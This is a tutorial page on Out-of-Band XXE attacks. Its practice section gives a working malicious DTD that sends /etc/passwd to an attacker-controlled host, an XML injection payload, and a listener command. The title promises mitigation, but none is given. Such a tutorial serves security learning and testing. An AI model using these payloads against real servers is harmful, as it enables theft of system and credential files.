---
title: 'Out of Band XXE Attack: Exploit and Mitigation'
description: Learn how to perform Out of Band XXE attacks to exfiltrate data using
  XML and external entities.
keywords:
- Out of Band XXE
- XML External Entity
- data exfiltration
- HTTP callbacks
- malicious DTD
- blind XXE attack
- server exploitation
---

# Out of Band XXE

## Context

The purpose of this article is to demonstrate how to exploit an Out of Band (OOB) XML External Entity (XXE) vulnerability to exfiltrate sensitive data via external entities using HTTP callbacks. This requires a solid understanding of XML structure, DTD usage, HTTP request basics, and Blind XXE fundamentals. OOB XXE allows attackers to bypass systems where immediate interaction from XML processors is restricted by leveraging external connections for data leaks.

## Theory

### Out of Band XXE Fundamentals

OOB XXE is a specialized attack that manipulates XML processors capable of accessing external resources on behalf of the server. This attack takes place when an attacker injects XML containing malicious DTD references. These references enable the attackers to initiate HTTP requests from the server to an attacker-controlled infrastructure, thereby exfiltrating sensitive data.

- The fundamental component of OOB XXE is the use of attacker-controlled DTDs. These DTDs reference URLs that point to the attacker's server, allowing stolen data to be captured and stored remotely.

- The attack sequence for OOB XXE involves:
  1. Injecting an XXE payload that includes a reference to a malicious external DTD.
  2. The server parses this XML, resolves the external entity, and makes an HTTP request to the attacker's server.
  3. Data is thus transferred out of band, bypassing traditional XML result boundaries.

### External DTDs and HTTP Exfiltration

External DTDs are crafted to include entities that, when resolved by the server, cause the server to make an outbound HTTP request. This request can carry exfiltrated data as part of its URL or headers back to an attacker's infrastructure.

- **Data Flow**: Through an OOB XXE attack, sensitive file contents, such as configuration files or passwords, are inserted into HTTP requests and sent to the attacker's server.

- **Protocol Weakness**: A critical flaw in server-side XML parsers is their default behavior to resolve and fetch content from any specified URL in external entities. This creates a channel for exfiltration without needing immediate XML output.

### Attacker Infrastructure for OOB XXE

A public HTTP server is used to receive the data exfiltrated from the target system. Such infrastructure can be easily set up using minimal resources and tools.

- Tools like `xxe.sh` facilitate automating the setup of a malicious DTD and help capture HTTP requests efficiently. These tools allow attackers to focus on the payload crafting without worrying about the nuances of server configuration.

## Practice

### OOB XXE via External DTD and HTTP Callback

To carry out an OOB XXE attack, follow these steps:

- Set up a public HTTP server to capture exfiltrated data.
  - This server will be used to monitor and receive incoming HTTP requests with sensitive data from the target.

```bash
python3 -m http.server 8080
```

- Craft a malicious DTD designed to exfiltrate sensitive file content via an HTTP request. The following DTD needs to reference an attacker-controlled IP address and port:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all '<!ENTITY &#x25; send SYSTEM "http://YOUR-ATTACKER-IP:8080/?x=%file;">'>
%all;
```
> Ensure to replace `YOUR-ATTACKER-IP` with your actual server IP address.

- Inject an XML payload that references the external DTD. When processed, this prompts the server to fetch your malicious DTD file.

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % ext SYSTEM "http://YOUR-ATTACKER-IP:8080/malicious.dtd">
%ext;
]>
<data>&send;</data>
```
> Replace `YOUR-ATTACKER-IP` with your actual server IP.

- Monitor your HTTP server for incoming requests. These will contain portions or all of the exfiltrated data as part of the query string or request header values.

The ultimate objective of this approach is to successfully exfiltrate sensitive content from a vulnerable server to your controlled environment over HTTP.

## Tools

- **python3**
- **xxe.sh** 

This concludes the steps and necessary concepts needed to successfully perform an Out of Band XXE attack. With these insights, a practitioner can execute these attacks in controlled environments to understand their mechanics and implications better.